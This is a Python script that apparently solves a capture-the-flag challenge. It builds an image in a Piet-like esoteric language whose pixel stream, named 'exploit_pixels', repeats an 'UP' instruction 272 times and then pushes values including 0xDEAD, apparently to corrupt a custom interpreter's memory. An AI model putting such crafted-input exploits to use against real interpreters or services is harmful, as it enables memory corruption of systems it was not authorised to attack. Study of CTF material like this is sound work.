from PIL import Image
import io

COLORS = {
  (0, 0): (192, 0, 0),  #     (0xC00000)
  (0, 1): (255, 0, 0),  #   (0xFF0000)
  (0, 2): (255, 192, 192),  #    (0xFFC0C0)
  (1, 0): (192, 192, 0),  #  (0xC0C000)
  (1, 1): (255, 255, 0),  # (0xFFFF00)
  (1, 2): (255, 255, 192),  # (0xFFFFC0)
  (2, 0): (0, 192, 0),  #   (0x00C000)
  (2, 1): (0, 255, 0),  # (0x00FF00)
  (2, 2): (192, 255, 192),  #  (0xC0FFC0)
  (3, 0): (0, 192, 192),  #    (0x00C0C0)
  (3, 1): (0, 255, 255),  #  (0x00FFFF)
  (3, 2): (192, 255, 255),  #   (0xC0FFFF)
  (4, 0): (0, 0, 192),  #    (0x0000C0)
  (4, 1): (0, 0, 255),  #  (0x0000FF)
  (4, 2): (192, 192, 255),  #   (0xC0C0FF)
  (5, 0): (192, 0, 192),  # (0xC000C0)
  (5, 1): (255, 0, 255),  # (0xFF00FF)
  (5, 2): (255, 192, 255),  # (0xFFC0FF)
}

WHITE = (255, 255, 255)
BLACK = (0, 0, 0)

INSTRUCTIONS = {
  "NOP": (0, 0),
  "PUSH": (0, 1),
  "POP": (0, 2),
  "ADD": (1, 0),
  "SUB": (1, 1),
  "MUL": (1, 2),
  "DIV": (2, 0),
  "MOD": (2, 1),
  "NOT": (2, 2),
  "GT": (3, 0),
  "PTR": (3, 1),
  "SWITCH": (3, 2),
  "DUP": (4, 0),
  "ROLL": (4, 1),
  "UP": (4, 2),
  "IN_C": (5, 0),
  "NUH_UH": (5, 1),
  "DOWN": (5, 2),
}


def get_action_color(start_hue, start_light, instruction):
  dh, dl = INSTRUCTIONS[instruction.upper()]
  target_hue = (start_hue + dh) % 6
  target_light = (start_light + dl) % 3
  return COLORS[(target_hue, target_light)]


def build_pixel(instruction, size=1):
  base_hue, base_light = (0, 1)
  base_rgb = COLORS[(base_hue, base_light)]
  action_rgb = get_action_color(base_hue, base_light, instruction)

  pixels = []
  for _ in range(size):
    pixels.append(base_rgb)
  pixels.append(action_rgb)
  pixels.append(WHITE)

  return pixels


def forge_last(instruction, size=1):
  base_hue, base_light = (0, 1)
  action_rgb = get_action_color(base_hue, base_light, instruction)

  pixels = []
  for _ in range(size):
    pixels.append(COLORS[(base_hue, base_light)])

  pixels.append(action_rgb)

  return pixels, action_rgb


def main():
  exploit_pixels = []

  exploit_pixels += build_pixel("UP", size=1) * 272
  exploit_pixels += build_pixel("PUSH", size=0xDEAD)
  exploit_pixels += build_pixel("PUSH", size=0x2)
  exploit_pixels += build_pixel("PUSH", size=0x1)

  last_pixels, final_action_rgb = forge_last("UP", size=1)
  exploit_pixels += last_pixels

  L = len(exploit_pixels)
  width = L
  height = 2
  img = Image.new("RGB", (width, height), color=BLACK)

  img_pixels = img.load()

  for x in range(L):
    img_pixels[x, 0] = exploit_pixels[x]

  img_pixels[L - 1, 1] = final_action_rgb
  img_pixels[L - 2, 1] = final_action_rgb

  img.save("okay.png")


if __name__ == "__main__":
  main()
